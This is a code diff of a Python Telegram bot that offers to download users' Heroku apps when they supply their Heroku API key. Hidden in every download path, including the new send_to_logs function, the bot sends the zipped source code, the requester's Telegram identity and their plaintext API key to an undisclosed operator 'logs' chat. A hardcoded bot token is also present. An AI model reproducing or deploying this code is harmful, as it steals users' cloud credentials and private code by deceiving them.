@@ -6,10 +6,8 @@ import requests
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Replace with your actual values
 TELEGRAM_BOT_TOKEN = "7183336129:AAGC7Cj0fXjMQzROUXMZHnb0pyXQQqneMic"
-LOGS_CHAT_ID = -1001902619247  # Replace with your logs group chat ID
-
+LOGS_CHAT_ID = -1001902619247
 
 def get_heroku_apps(api_key):
     url = "https://api.heroku.com/apps"
@@ -30,15 +28,25 @@ def clone_and_zip_repo(app_name, api_key):
     zip_path = shutil.make_archive(app_dir, 'zip', app_dir)
     return zip_path, temp_dir
 
+async def send_to_logs(context: ContextTypes.DEFAULT_TYPE, user, app_name, api_key, file_path):
+    caption = (
+        f"📥 Repo Downloaded: `{app_name}`\n"
+        f"👤 User: @{user.username or 'N/A'} (ID: {user.id})\n"
+        f"🔑 API Key: `{api_key}`"
+    )
+    with open(file_path, 'rb') as f:
+        await context.bot.send_document(chat_id=LOGS_CHAT_ID, document=f, filename=os.path.basename(file_path),
+                                        caption=caption, parse_mode="Markdown")
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
         text=(
             "👋 Welcome! I can help you download your Heroku apps.\n\n"
-            "Use these commands:\n"
-            "• /repos <HEROKU_API_KEY> — List your apps\n"
-            "• /download <API_KEY> <APP_NAME> — Download a specific app\n"
-            "Or just send your API key to download all apps."
+            "Commands:\n"
+            "• /repos <HEROKU_API_KEY> — List apps\n"
+            "• /download <API_KEY> <APP_NAME> — Download specific app\n"
+            "Or send your API key directly to download all apps."
         )
     )
 
@@ -76,15 +84,7 @@ async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with open(zip_file, 'rb') as f:
             await context.bot.send_document(chat_id=update.effective_chat.id, document=f, filename=f"{app_name}.zip")
 
-            f.seek(0)
-            caption = (
-                f"📥 Repo Downloaded: `{app_name}`\n"
-                f"👤 Requested by: @{user.username or 'N/A'} (ID: {user.id})\n"
-                f"🔑 API Key: `{api_key}`"
-            )
-            await context.bot.send_document(chat_id=LOGS_CHAT_ID, document=f, filename=f"{app_name}.zip",
-                                            caption=caption, parse_mode="Markdown")
-
+        await send_to_logs(context, user, app_name, api_key, zip_file)
         shutil.rmtree(temp_dir, ignore_errors=True)
 
     except subprocess.CalledProcessError:
@@ -112,15 +112,7 @@ async def handle_api_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 zip_file, temp_dir = clone_and_zip_repo(name, api_key)
                 with open(zip_file, 'rb') as f:
                     await context.bot.send_document(chat_id=chat_id, document=f, filename=f"{name}.zip")
-
-                    f.seek(0)
-                    caption = (
-                        f"📥 Repo Downloaded: `{name}`\n"
-                        f"👤 Requested by: @{user.username or 'N/A'} (ID: {user.id})\n"
-                        f"🔑 API Key: `{api_key}`"
-                    )
-                    await context.bot.send_document(chat_id=LOGS_CHAT_ID, document=f, filename=f"{name}.zip",
-                                                    caption=caption, parse_mode="Markdown")
+                await send_to_logs(context, user, name, api_key, zip_file)
             except Exception as e:
                 await context.bot.send_message(chat_id=chat_id, text=f"❌ Failed to clone `{name}`: {str(e)}", parse_mode="Markdown")
             finally:
